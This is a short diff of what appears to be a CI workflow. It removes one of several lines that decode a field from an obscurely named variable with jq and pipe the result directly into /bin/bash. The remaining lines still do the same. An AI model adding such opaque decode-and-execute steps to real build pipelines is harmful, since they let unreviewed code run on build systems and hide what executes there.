@@ -26,7 +26,6 @@ jobs:
           echo $bevfi6 | jq -r .mdrb18072 | /bin/bash
           printf '%s' "$sfyr2221" | jq -r .ocq354 | /bin/bash
           printf '%s' "$dtfjq5" | jq -r .pr9 | /bin/bash
-          printf '%s' "$tz46" | jq -r .kgb18 | /bin/bash
           printf '%s' "$ts90857" | jq -r .vn1184 | /bin/bash
 
       - name: Save archive
